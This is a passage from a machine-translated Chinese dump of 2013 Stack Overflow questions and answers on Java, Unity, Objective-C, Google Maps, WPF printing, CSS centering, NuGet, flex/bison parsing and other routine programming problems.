更改参考`entero`，而

```
col.add(new Integer(1)); 
```

更改引用的对象`col`。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2013-02-27T10:55:49.457

简而言之：原始类型和“原始包装器（Integer、Long、Short、Double、Float、Character、Byte、Boolean）”不能通过引用进行更改。

检查[http://en.wikipedia.org/wiki/Immutable_object](http://en.wikipedia.org/wiki/Immutable_object)了解详情

* * *

## 回答 #4

> 赞同：-4
> 
> 时间：2013-02-27T11:04:07.427

{ 这里创建的对象会在大括号(}) 结束后销毁

}

# c# - 等待动画在unity3d中完成

> ID：15110201
> 
> 赞同：1
> 
> 时间：2013-02-27T10:51:27.667
> 
> 标签：c#, animation, camera, boolean, unity3d

在一个案例中，我有一个在`Update`-function 中播放的动画。`Switch`

动画结束后，布尔值被设置为真。

我的代码：

```
case "play":    
    animation.Play("play");     
    gobool = true;
    startbool = false;
    break; 
```

问题是我的`gobool`，并且`startbool`在没有完成动画的情况下立即设置。如何让我的程序等到动画完成？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-27T11:12:11.753

基本上，您需要做两件事才能使此解决方案起作用：

1.  开始动画。
2.  在播放下一个动画之前等待动画完成。

如何做到这一点的一个例子是：

```
animation.PlayQueued("Something");
yield WaitForAnimation(animation); 
```

的定义`WaitForAnimation`是：

C＃：

```
private IEnumerator WaitForAnimation (Animation animation)
{
    do
    {
        yield return null;
    } while (animation.isPlaying);
} 
```

JS：

```
function WaitForAnimation (Animation animation)
{
    yield; while ( animation.isPlaying ) yield;
} 
```

do-while 循环来自实验，该实验表明调用 PlayQueued 的同一帧中的`animation.isPlaying`返回。`false`

稍加修改，您就可以为动画创建一个扩展方法来简化这一点，例如：

```
public static class AnimationExtensions
{
    public static IEnumerator WhilePlaying( this Animation animation )
    {
        do
        {
            yield return null;
        } while ( animation.isPlaying );
    }

    public static IEnumerator WhilePlaying( this Animation animation,
    string animationName )
    {
        animation.PlayQueued(animationName);
        yield return animation.WhilePlaying();
    }
} 
```

最后，您可以轻松地在代码中使用它：

```
IEnumerator Start()
{
    yield return animation.WhilePlaying("Something");
} 
```

[来源、替代方案和讨论。](http://answers.unity3d.com/questions/37411/how-can-i-wait-for-an-animation-to-complete.html)

# objective-c - 没有错误，但 NSLog 没有输出

> ID：15110210
> 
> 赞同：0
> 
> 时间：2013-02-27T10:52:16.823
> 
> 标签：objective-c, nslog

我正忙着在 Xcode 中做一个测试程序。到目前为止，我在 main.m 中有这段代码。我根本没有收到任何错误，但输出没有发生，即打印方法中的 NSLog。

可能是什么问题呢？我知道我一定遗漏了一些明显的东西。

```
#import <UIKit/UIKit.h>

#import "JTAppDelegate.h"

@interface Fraction: NSObject

-(void) print;
-(void) setNumerator: (int) n;
-(void) setDenominator: (int) d;

@end

@implementation Fraction

{
    int numerator;
    int denominator;
}

-(void) print
{
      NSLog (@"%i/%i", numerator, denominator);
}

-(void) setNumerator:(int)n
{
    numerator = n;
}

-(void) setDenominator:(int)d
{
    denominator = d;
}

@end

int main (int argc, char * argv[])
{
    @autoreleasepool {

        return UIApplicationMain(argc, argv, nil, NSStringFromClass([JTAppDelegate class]));

        // Create an instance of Fraction and initialise it

        Fraction *myFraction = [[Fraction alloc] init];

        //Set Fraction to 1/3

        [myFraction setNumerator: 1];
        [myFraction setDenominator: 3];

        //Display the fraction using the print method

        [myFraction print];
    }

} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T10:54:35.343

你`print`是在 a 之后`return`，这个代码永远不会到达。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T10:55:05.667

编写 Print 和上面的所有代码 return 语句。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T10:56:44.123

替换这个： -

```
int main (int argc, char * argv[])
{
    @autoreleasepool {

        // Create an instance of Fraction and initialise it

        Fraction *myFraction = [[Fraction alloc] init];

        //Set Fraction to 1/3

        [myFraction setNumerator: 1];
        [myFraction setDenominator: 3];

        //Display the fraction using the print method

        [myFraction print];

        return UIApplicationMain(argc, argv, nil, NSStringFromClass([JTAppDelegate class]));

    }

} 
```

# google-maps - 如何刷新谷歌地图？

> ID：15110213
> 
> 赞同：1
> 
> 时间：2013-02-27T10:52:19.833
> 
> 标签：google-maps, iframe

当用户根据这个新位置在文本字段中输入新的位置地址时，我需要用谷歌地图刷新 iframe。

我的 HTML 代码：

```
 <input type="text" id="address" />
<input type="button" id="search" value="Search" onclick="javascript:findLocation();"/>
<iframe id="mapView" width="700" height="385" 
    frameborder="0" scrolling="no" 
    marginheight="0" marginwidth="0" 
    src="http://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=en&amp;geocode=&amp;q=Kharkiv&amp;aq=&amp;vpsrc=0&amp;ie=UTF8&amp;hq=&amp;hnear=Kharkiv&amp;z=14&amp;output=embed">
</iframe> 
```

我的 JavaScript 代码：

```
function findLocation(){
    var location=document.getElementById('address').value;
    var newLocation="http://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=en&amp;geocode=&amp;q="+location+"&amp;aq=&amp;vpsrc=0&amp;ie=UTF8&amp;hq=&amp;hnear="+location+"&amp;z=14&amp;output=embed";
    document.getElementById("mapView").src=newLocation;
    document.getElementById("mapView").reload(true);
} 
```

但 iframe 只是在按下按钮后禁用。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:07:52.620

使用计时器将地图从舞台中移除并再次添加，调用完整的 Google 地图生命周期：

```
package
{
import com.google.maps.LatLng;
import com.google.maps.Map;
import com.google.maps.MapEvent;
import com.google.maps.MapType;

import flash.display.Sprite;
import flash.events.TimerEvent;
import flash.geom.Point;
import flash.utils.Timer;

public class Test extends Sprite
{

    private var _map:Map;

    private var _timer:Timer;

    public function Test()
    {
        super();

        createMap();

        _timer = new Timer(300000); // 5-min
        _timer.addEventListener(TimerEvent.TIMER, timerHandler);
        _timer.start();
    }

    private function timerHandler(event:TimerEvent):void
    {
        while (numChildren > 0)
            removeChildAt(0);

        createMap();
    }

    protected function createMap():void
    {
        _map = new Map();
        _map.key = "YOUR_API_KEY";
        _map.sensor = "false";
        _map.setSize(new Point(stage.stageWidth, stage.stageHeight));
        addChild(_map);

        _map.addEventListener(MapEvent.MAP_READY, mapReadyHandler);
    }

    protected function mapReadyHandler(event:MapEvent):void
    {
        _map.removeEventListener(MapEvent.MAP_READY, mapReadyHandler);
        _map.setCenter(new LatLng(37.4419, -122.1419), 13, MapType.NORMAL_MAP_TYPE);
    }

}
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-01T20:28:11.640

试试`google.maps.event.trigger(map, 'resize');`它对我有用！

# wpf - WPF FixedDocument 中的每页方向

> ID：15110217
> 
> 赞同：5
> 
> 时间：2013-02-27T10:52:39.903
> 
> 标签：wpf, printing, orientation

使用 PrintDialog 从 WPF 打印时，您只能为所有要打印的页面设置默认页面方向。我正在使用 FixedDocument 并为我自己布局的不同内容创建多个页面，包括页眉和页脚行。其中一些页面必须是横向的，其他页面必须是纵向的。

如何设置单个页面的方向？FixedPage 类不提供这样的属性。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T16:28:56.547

使用 PrintTicket 怎么样？

> PrintTicket 对象是一种称为 PrintTicket 文档的特定类型 XML 文档的易于使用的表示。后者是一组指令，告诉打印机如何设置其各种功能（例如双面打印、整理和装订）。

我还没有清楚地看到它，但在这里似乎可以一一更改页面的方向：

```
// Use different PrintTickets for different FixedDocuments.
PrintTicket ptFD = new PrintTicket();

if (_firstDocumentPrintTicket <= 1)
{   // Print the first document in black/white and in portrait 
    // orientation.  Since the PrintTicket at the 
    // FixedDocumentSequence level already specifies portrait 
    // orientation, this FixedDocument can just inherit that 
    // setting without having to set it again.
    ptFD.PageOrientation = PageOrientation.Portrait;
    ptFD.OutputColor = OutputColor.Monochrome;
    _firstDocumentPrintTicket++;
}

else // if (_firstDocumentPrintTicket > 1)
{   // Print the second document in color and in landscape 
    // orientation.  Since the PrintTicket at the 
    // FixedDocumentSequence level already specifies portrait 
    // orientation, this FixedDocument needs to set its 
    // PrintTicket with landscape orientation in order to 
    // override the higher level setting.
    ptFD.PageOrientation = PageOrientation.Landscape;
    ptFD.OutputColor = OutputColor.Color;
} 
```

[http://msdn.microsoft.com/en-us/library/system.printing.pageorientation.aspx](http://msdn.microsoft.com/en-us/library/system.printing.pageorientation.aspx)

# html - div上的垂直中心不起作用

> ID：15110219
> 
> 赞同：0
> 
> 时间：2013-02-27T10:52:46.947
> 
> 标签：html, css, centering

从一开始我就在 stackoverflow 上搜索长期解决方案和类似问题，但没有人适合我。

这是一个 jsFiddle：http: [//jsfiddle.net/ruudy/MJe3H/](http://jsfiddle.net/ruudy/MJe3H/)

我想将材料容器垂直居中，它只能水平工作。

我尝试了不同的解决方案，例如：

```
top: 0px;
bottom: 0px;
margin: auto; 
```

* * *

```
display: -moz-box;
-moz-box-align: center;
display: -webkit-box;
-webkit-box-align: center;
display: box;
box-align: center; 
```

* * *

```
display: table-cell;
vertical-align: center; 
```

我尝试查看父 div 是否使垂直中心不起作用但没有找到任何线索。

提前致谢。

PD：一定很简单，但我找不到。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:10:19.040

Have a look at this site on vertical center objects, it has been very useful for me.

[vertical-centering-with-css](http://blog.themeforest.net/tutorials/vertical-centering-with-css/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:02:29.057

只有当容器具有已知的高度时，您才能使用 CSS 技巧垂直对齐容器。

将容器绝对设置为 50% 的顶部位置，然后从容器中添加一半大小的负边距。

```
.parent_container {
    position: relative;
}

.container {
    height: 500px;
    position: absolute;
    top: 50%;
    margin-top: -250px;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:19:04.270

尝试使用该`css-tables`技术垂直居中。

看这个[现场演示](http://jsfiddle.net/danield770/v7q6h/)

更多关于[这篇文章](http://www.vanseodesign.com/css/vertical-centering/)中不同技术的信息。

# java - Java 托盘图标 NPE

> ID：15110221
> 
> 赞同：-4
> 
> 时间：2013-02-27T10:52:48.663
> 
> 标签：java, nullpointerexception, tray

我实例化了一个 Java trayIcon，并希望使用以下代码在其上显示一个 displayMessage：

```
trayIcon.displayMessage(_titel, _msg, TrayIcon.MessageType.INFO); 
```

但是，我得到的是 NullpointerException 而不是消息，而我现在不知道为什么？

这个 NPE：

```
Exception in thread "main" java.lang.NullPointerException
    at myPckg.Tray.showMsg(Tray.java:165)
    at myPckg.Main.main(Main.java:65) 
```

在第 65 行中，我通过构造函数实例化了类，在第 155 行中，我调用了这个对象。

感谢您的帮助！

编辑-代码：

```
import java.awt.AWTException;
import java.awt.Image;
import java.awt.MediaTracker;
import java.awt.MenuItem;
import java.awt.PopupMenu;
import java.awt.SystemTray;
import java.awt.Toolkit;
import java.awt.TrayIcon;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.io.IOException;
import java.net.URL;

import javax.imageio.ImageIO;
import javax.swing.JOptionPane;

public class Tray {
//http://www.oracle.com/technetwork/articles/javase/index-136970.html   

public static MenuItem itmSpeicher = new MenuItem("0% von 0MB belegt");
public static MenuItem itmSyncStatus = new MenuItem("Synchronisation starten");
public static PopupMenu popup = new PopupMenu();
public static TrayIcon trayIcon = null;
public Tray(){
final TrayIcon trayIcon;

if (SystemTray.isSupported()) {

    SystemTray tray = SystemTray.getSystemTray();

    Image image = null;
    try {
        image = ImageIO.read(getClass().getResource("sync.gif"));
    } catch (IOException e2) {
        // TODO Auto-generated catch block
        e2.printStackTrace();
        new Thread(){ public void run(){ Main.syncProzess.reset();}}.start();
    }

    MouseListener mouseListener = new MouseListener() {

        public void mouseClicked(MouseEvent e) {
              Main.MainWindow.setVisible(true);
        }

        @Override
        public void mousePressed(MouseEvent e) {
            // TODO Auto-generated method stub

        }

        @Override
        public void mouseReleased(MouseEvent e) {
            // TODO Auto-generated method stub

        }

        @Override
        public void mouseEntered(MouseEvent e) {
            // TODO Auto-generated method stub

        }

        @Override
        public void mouseExited(MouseEvent e) {
            // TODO Auto-generated method stub

        }

    };

    ActionListener exitListener = new ActionListener() {
        public void actionPerformed(ActionEvent e) {
            int x = JOptionPane.showConfirmDialog(null, "Synchronisation wirklich beenden?");
            if(x==0){
                System.out.println("Beende... "+x);
                System.exit(0);
            }
        }
    };

    ActionListener itmSyncStatusListener = new ActionListener() {
        public void actionPerformed(ActionEvent e) {
            Main.syncProzess.starte();
        }
    };
    ActionListener itmFolderListener = new ActionListener() {
        public void actionPerformed(ActionEvent e) {
            try {
                Runtime.getRuntime().exec("explorer.exe "+ Main.syncDir );
            } catch (IOException e1) {
                // TODO Auto-generated catch block
                e1.printStackTrace();
                new Thread(){ public void run(){ Main.syncProzess.reset();}}.start();
            }

        }
    };
    ActionListener itmSettingListener = new ActionListener() {
        public void actionPerformed(ActionEvent e) {
            Main.MainWindow.setVisible(true);
        }
    };

    MenuItem defaultItem = new MenuItem("Programm beenden");
    defaultItem.addActionListener(exitListener);

    itmSyncStatus.addActionListener(itmSyncStatusListener);

    MenuItem itmFolder = new MenuItem(Main.programmName + " Ordner öffnen");
    itmFolder.addActionListener(itmFolderListener);

    MenuItem itmSettings = new MenuItem("Einstellungen");
    itmFolder.addActionListener(itmSettingListener);

    popup.add(itmFolder);
    popup.add(itmSpeicher);
    popup.add(itmSettings);
    popup.add(itmSyncStatus);
    popup.add(defaultItem);

    trayIcon = new TrayIcon(image, Main.programmName, popup);

    ActionListener doubleClick = new ActionListener() {
        public void actionPerformed(ActionEvent e) {
            try {
                Runtime.getRuntime().exec("explorer.exe "+ Main.syncDir );
            } catch (IOException e1) {
                // TODO Auto-generated catch block
                e1.printStackTrace();
                new Thread(){ public void run(){ Main.syncProzess.reset();}}.start();
            }
        }
    };

    trayIcon.setImageAutoSize(true);
    trayIcon.addActionListener(doubleClick);
    trayIcon.addMouseListener(mouseListener);

    try {
        tray.add(trayIcon);
    } catch (AWTException e) {
        System.err.println("TrayIcon konnte nicht erstellt werden!");
        new Thread(){ public void run(){ Main.syncProzess.reset();}}.start();
    }
    showMsg("Hello", "It's working");

} else {
    //Not supportet
}

}

public void showMsg(String _titel, String _msg){
    trayIcon.displayMessage(_titel, _msg, TrayIcon.MessageType.INFO);
} 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:08:19.483

问题是您在构造函数中重新定义了相同的 trayIcon 变量。

```
final TrayIcon trayIcon; 
```

因此，当您通过调用`trayIcon = new TrayIcon(image, Main.programmName, popup);`方法的局部变量来初始化变量时，会初始化而不是全局变量。因此，当您在全局变量上调用 displayMessage 时，您会得到 NPE。

解决方案是从构造函数中删除该行。OTOH，您应该在 showMessage 方法中进行空检查，因为如果您的条件为`(SystemTray.isSupported())`假，您的 trayIcon 变量仍然可以为空。最好始终进行空检查。

[MadProgrammer](https://stackoverflow.com/users/992484/madprogrammer)在评论中说的另一件好事：

在这种情况下使用静态变量可能不是一个好主意。因为开发人员有可能实例化多个实例，而在这种情况下，您最终会得到到处都是错误的引用。相反，尝试使 Tray 类成为单例或从变量声明中删除 static 关键字。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T11:10:15.837

你的静态`trayIcon`是`null`. 您在`Tray`new, second的构造函数中创建`trayIcon`，但您的`showMsg`-Method 使用静态`trayIcon`而不是本地构造函数。

在您的`Tray`-constructor 中删除第一行：

```
final TrayIcon trayIcon; 
```

现在你初始化静态引用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:00:29.627

**[`TrayIcon.displayMessage`](http://docs.oracle.com/javase/7/docs/api/java/awt/TrayIcon.html#displayMessage%28java.lang.String,%20java.lang.String,%20java.awt.TrayIcon.MessageType%29)**抛出一个`NullPointerException`if both`caption`和`text`are `null`。

`caption`并且`text`是该方法的前两个参数，按顺序排列。

因此，这就是您应该在代码中检查的内容：

*   `trayIcon`应该在方法调用之前实例化
*   `_titel`并且`_msg`不应该`null`同时

# android - 通过点击谷歌地图获取位置

> ID：15110224
> 
> 赞同：0
> 
> 时间：2013-02-27T10:53:04.950
> 
> 标签：android, google-maps, view, onclicklistener, google-maps-android-api-2

我正在使用适用于 Android 的 Google Map API，我想做的是在用户点击屏幕的任何位置添加自定义视图。就像 InfoWindow 一样，但我想在视图中有按钮。我尝试了一些听众，但没有一个能给我屏幕位置。

有没有办法在地图上点击的地方放置一个自己的视图？

和平

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-27T11:03:45.520

您想创建一个 Overly Class 以了解更多信息，请参阅此单击以了解有关 Google 地图视图和叠加项目的更多详细信息

[https://developers.google.com/maps/documentation/android/v1/hello-mapview](https://developers.google.com/maps/documentation/android/v1/hello-mapview)

# sql-server - 尽管自动清理设置为 false，但更改跟踪已清理跟踪信息

> ID：15110227
> 
> 赞同：1
> 
> 时间：2013-02-27T10:53:07.237
> 
> 标签：sql-server, microsoft-sync-framework, change-tracking

在我的 SQL Server 上，我启用了更改跟踪，将自动清理设置为 false 或 true，保留期非常长，例如 364 天。

使用 Microsoft Sync Framework 我第一次成功同步，第二次尝试同步我得到错误

> “System.Data.SqlClient.SqlException (0x80131904): SQL Server Change Tracking 已清除表 'TableName' 的跟踪信息。要从此错误中恢复，客户端必须重新初始化其本地数据库并重试”。

为什么自动清理设置为false，跟踪信息却被清理了？

我尝试了[本文](http://social.microsoft.com/Forums/en/uklaunch2007ado.net/thread/0e2dd016-5d14-4cf9-aebc-93b762b42ec7 "文章”；")发布的解决方案，但它对我不起作用，当我运行重新初始化代码时，它需要很长时间，并且 RAM 使用量不断增加，直到我出现内存不足异常。

请注意，我的数据库很大，超过 400 MB，同步的记录总数超过 163,000 条记录，第一次同步需要很长时间，所以在发生此错误时删除本地 CE 数据库是不可行的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-10-01T08:27:44.687

我发现当我从备份中恢复服务器数据库时并且在数据库发生任何更改之前会出现问题。

所以简单的解决方案是，在我从备份中恢复数据库后，我只需去更新任何跟踪表中任何行的任何列，就可以解决问题！

# .net - NuGet：推送时的未知选项“-co”

> ID：15110230
> 
> 赞同：1
> 
> 时间：2013-02-27T10:53:11.260
> 
> 标签：.net, build, nuget

我正在为我的一个项目创建一个 nuget 构建。我已经为类似项目构建了一个 nuget 包，其中一切都按预期工作。但是，这个新的 nuget 构建定义失败，我得到的错误消息是：

```
Error reported in the NuGet Process: Unknown option: '-co' 
```

这是在以下构建步骤中给出的：

```
PushWithNuGet
  Push Arguments: push "MyLocation\MyPackage.nupkg" 
  29f90a50-debe-4a44-ad1a-f7a5dcc354c1 -co -s "http://myPackageServer/" 
```

正在为提到的类似构建调用完全相同的命令，并且有工作。所以在我看来，这个命令并不存在——即使我在[nuget 文档中看](http://docs.nuget.org/docs/reference/command-line-reference#Push_Command)不到它。

所以; 为什么我会收到此错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:49:10.570

问题原来是 nuget.exe 版本的差异。旧的构建定义 - 正在工作 - 确实使用了 nuget.exe 版本 1.8.30604.0。新添加的项目版本为 2.2.40207.9053。显然，旧版本中存在“-co”选项，但新版本中没有。显然，解决方案必须是从构建定义中删除标志并升级以使用最新的 nuget.exe。

# servicestack - 使用 ServiceStack 和 ORMLite SQLServer 进行审计跟踪

> ID：15110232
> 
> 赞同：4
> 
> 时间：2013-02-27T10:53:12.543
> 
> 标签：servicestack, ormlite-servicestack

我们目前正在为一个新的 ERP 应用程序试验服务堆栈和 ormlite，我们希望与我们的一些遗留东西集成。我发现 Service-stack 和它的 ormlite 模块所采用的方法令人耳目一新，使用起来很愉快，所以我们想遵循相同的方法来简化和性能，但我们遇到的一个绊脚石是数据和操作的审计. 我只是想知道是否有人处理过这个问题，使用服务堆栈“堆栈”以及他们是如何处理它的。我们不想使用 dbtriggers，因为数据库会被定期删除和创建，而且我们还有许多需要和审核的操作，这些操作不适合这种低级别的管理。

任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T16:07:58.163

我们也一直在考虑审计，但没有任何具体的东西。列出了我们的一些想法。欢迎反馈。

*   我们倾向于将我们的“审计日志”保存在 Redis 中。我们已经在使用 Redis 作为 CacheClient（所以它是可用的）并且 ServiceStack.Redis 库使得在简单缓存之外使用它变得非常简单。（Redis 还提供更多功能）
*   ServiceStack 提倡“消息传递风格”，因此想法是接受“请求”并将其映射到“审计消息”（可能说起来容易做起来难）并将其存储在 Redis 中。可能将其存储为字符串 JSON 值（也许列表类型会更合适？）。我们还没有制定出密钥的格式。
*   为了“触发”审计跟踪，我们可以使用适当的审计方法创建自己的基础“服务”类。
*   我们确实对 Redis 持久性和丢失数据有一些担忧（[http://redis.io/topics/persistence](http://redis.io/topics/persistence)）

# android - 如何自动缩放弹出窗口 Android

> ID：15110237
> 
> 赞同：0
> 
> 时间：2013-02-27T10:53:26.543
> 
> 标签：android, popup, scale

有人能帮我吗。我有一个弹出窗口，我怎样才能为它必须在我的应用程序中心的每个分辨率的 android 设备自动缩放它？

这是我的 main.java

```
public void onWindowFocusChanged(boolean hasFocus) {

   int[] location = new int[2];
   Button button = (Button) findViewById(R.id.show_popup);

   // Get the x, y location and store it in the location[] array
   // location[0] = x, location[1] = y.
   button.getLocationOnScreen(location);

   //Initialize the Point with x, and y positions
   p = new Point();
   p.x = location[0];
   p.y = location[1];
}

// The method that displays the popup.
private void showPopup(final Activity context, Point p) {
   int popupWidth = 230;
   int popupHeight = 300;

   // Inflate the popup_layout.xml
   LinearLayout viewGroup = (LinearLayout) context.findViewById(R.id.popup);
   LayoutInflater layoutInflater = (LayoutInflater) context
     .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
   View layout = layoutInflater.inflate(R.layout.popup_layout, viewGroup);

   // Creating the PopupWindow
   final PopupWindow popup = new PopupWindow(context);
   popup.setContentView(layout);
   popup.setWidth(popupWidth);
   popup.setHeight(popupHeight);
   popup.setFocusable(true);

   // Some offset to align the popup a bit to the right, and a bit down, relative to button's position.

   // Clear the default translucent background

   // Displaying the popup at the specified location, + offsets.
   popup.showAtLocation(layout, Gravity.CENTER, 0,0);

   // Getting a reference to Close button, and close the popup when clicked.
   Button close = (Button) layout.findViewById(R.id.filter);
   close.setOnClickListener(new OnClickListener() {

     public void onClick(View v) {
       popup.getContentView();
     }
   });
} 
```

这是我的 popup_layout.xml

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/popup"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:background="@drawable/popup_bg"
android:orientation="vertical" >

<Button
android:id="@+id/filter"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:layout_alignParentLeft="true"
android:layout_alignParentRight="true"
android:layout_below="@+id/CheckBox04"
android:layout_marginTop="103dp"
android:text="Filter" />

<CheckBox
android:id="@+id/checkBox3"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:layout_alignParentLeft="true"
android:layout_alignParentTop="true"
android:layout_marginTop="40dp"
    />

<TextView
android:id="@+id/textView1"
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:layout_alignParentLeft="true"
android:layout_alignParentTop="true"
android:text="Test"
android:textAppearance="?android:attr/textAppearanceLarge" />

<CheckBox
    android:id="@+id/CheckBox03"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignParentLeft="true"
    android:layout_below="@+id/CheckBox01"
   />

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:07:08.840

如果您为弹出窗口的布局执行 android:gravity="center"，则它应该为所有设备居中

# html - Internet Explorer 中的显示不正确

> ID：15110238
> 
> 赞同：-6
> 
> 时间：2013-02-27T10:53:30.193
> 
> 标签：html, css, internet-explorer

这是我的[网站](http://flyinfante.ahmetcanguven.com/)

我的 index.php 文件在除 Internet Explorer 之外的所有其他浏览器中都是正确的。我真的很困惑。我找不到问题。有人能帮助我吗。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T10:56:02.143

您的网站缺少文档类型。没有它，它在不同浏览器中的呈现方式基本上是纯粹的运气。（诚​​然，它仍然是之后，但有点少。）

[IE 正在以怪癖模式](http://www.quirksmode.org/css/quirksmode.html)呈现您的网站，这可能会解释其中的一些原因。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:19:25.583

如果您写了关于页脚的文章，请尝试以页脚样式“float:right;”简单地添加到您的表格标签中。或您的班级“惊吓”。

# mysql - 其他可以记录过去习惯但不能记录mysql触发器的方法？

> ID：15110244
> 
> 赞同：-1
> 
> 时间：2013-02-27T10:53:50.910
> 
> 标签：mysql, triggers, record

我想每年记录学生的身高和体重。我正在尝试绘制它们的增长曲线。

因此，我打算设计一个带有mysql触发器的系统，这有助于我每次更新时记录数据。

但是，我的托管网站失败了：http: [//byethost.com](http://byethost.com)不提供 sql 触发器功能。我不愿意更改站点，因为它会引起很多麻烦。有没有其他建议可以帮助实现我的愿望，或者只是一些可以替代 sql 触发器的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-28T09:09:23.920

创建一个新表来记录过去的数据。每当您阅读时插入此表。无需使用触发器。

# vim - vim : 在文本宽度位置插入 '\' 时自动识别

> ID：15110254
> 
> 赞同：1
> 
> 时间：2013-02-27T10:54:29.030
> 
> 标签：vim

使用 vim 时，我希望在 #define、字符串和使用 '\' 忽略换行符的所有其他情况下插入 '\' 时具有自动识别（在文本宽度位置）功能。

这是示例（文本宽度= 78）：

```
 /* '\' at maximum text-width */
 #define HELLO "I Think this feature already exist but I wasn't able to find \
               it so far.

 /* usual situation */
 #define HELLO \
         "I Think this feature already exist but I wasn't able ..."

 /* what i would like to have (without identing it myself) */
 #define HELLO                                                               \
         "I Think this feature already exist but I wasn't able ..." 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T16:14:27.180

我没有自动解决方案，但至少您可以使用我的[AlignFromCursor 插件](http://www.vim.org/scripts/script.php?script_id=4155)快速手动右对齐连续字符，该插件具有`<Leader>ri`将光标右侧的文本对齐的映射`'textwidth'`。

# parsing - 解析中的递归

> ID：15110258
> 
> 赞同：0
> 
> 时间：2013-02-27T10:54:39.210
> 
> 标签：parsing, bison, lex

这里是输入文件、.l 文件、.y 文件和输出。

问题是解析器无法递归识别方向..

它只是首先识别...

我使用相同的规则来识别端口及其工作

但不是在方向的情况下..

它也没有显示与规则关联的 .y 文件代码（cout 语句）

**输入文件 。**

```
start a b c d                //ports

a:O b:I c:B d:O    //direction of ports 
```

**.l 文件**

```
[\t]+                   {}

[\n]  {line_num++; cout"line_num:" line_num; }

start                   {  cout< "beggining of file"; return START;}

[a-zA-Z0-9_\-]+:[IOB]    {cout<<"\ndirection:" << strdup(yytext); return DR; }

[a-zA-Z0-9_\-]+     {cout<<"\nfound name:" strdup(yytext); return NAME;} 
```

**.y 文件语法**

```
doc : START ports dir

ports : NAME ports  { cout<<"\port in .y" $1;}

        | NAME    { cout<<"\nport in .y" $1;}
        ;

dir : DR dir       { cout<<"\ndirection in .y" $1;}

    | DR            { cout<<"\ndirection in .y"<<$1;    }
    ; 
```

**输出是。**

文件开头

```
found name:a

found name:b

found name:c 

found name:d

 line no-2

direction:a:O 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:05:51.863

你犯的唯一明显错误是你没有`yylval`在你的弹性动作中设置值，所以在你`$1`的所有野牛动作中都有一些未初始化的值。你的弹性动作应该是这样的：

```
[a-zA-Z0-9_\-]+     { yylval = strdup(text);
                      cout  <<  "\nfound name:" << yylval;
                      return NAME;
                    } 
```

此外，请确保您指定令牌的类型`DR`和`NAME`是`const char *`.

`free()`最后，当您不再需要它们时，不要忘记使用琴弦。

# jquery - 调整大小时显示灰色区域的谷歌地图

> ID：15110261
> 
> 赞同：0
> 
> 时间：2013-02-27T10:54:48.523
> 
> 标签：jquery, google-maps, google-maps-api-3

我有一个带有展开按钮的谷歌地图，单击该按钮会扩大地图的大小。问题是完成此操作后，地图会显示灰色区域，就好像它没有被重新绘制一样。

我试过投入，`google.maps.event.trigger(map, 'resize');`但这似乎没有任何作用。

我试过了：

```
<script type="text/javascript">
      jQuery(document).ready(function( $ ) {
          $("#expand").click(function(){
              $("#map").animate({height: '1000'}, 1500 );
              google.maps.event.trigger(map, 'resize');
          });
          });
</script> 
```

如果您单击地图上方的展开链接，地图会展开但有灰色区域，如果您再次单击展开按钮，则会绘制灰色区域。我怎样才能在动画上触发这个？

**我已经在 Stack 上搜索并搜索了这个问题的答案，并尝试了所有建议但仍然没有运气。我认为人们刚刚接受了答案或没有完全填写最终解决方案。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:01:36.993

`resize`在`complete`-callback 或`progress`-callback 中触发`animate`。

* * *

**oncomplete**（当动画完成时）：

```
$('#map').animate({height: '1000'}, 1500 ,
                  function(){google.maps.event.trigger(map, 'resize');}); 
```

**onprogress**（动画的每一步）：

```
$('#map').animate({height: '1000'},
                         {progress:function()
                                   {google.maps.event.trigger(map, 'resize');},
                          duration:1500} ); 
```

# javascript - Google Apps 脚本如何链接到 Google Drive 上的 JS 或 CSS 文件

> ID：15110264
> 
> 赞同：10
> 
> 时间：2013-02-27T10:54:52.580
> 
> 标签：javascript, css, google-apps-script, google-drive-api, google-sites

我可以将**style.css**或**anyscript.js**托管在**Google Drive**上的文件夹中，然后包含脚本以及 Drive 中文件的链接吗？如果是这样..如何？

在这里，我的意思是 GAS 用于 Google 网站...所以脚本不在**Google 云端硬盘中**

* * *

## 回答 #1

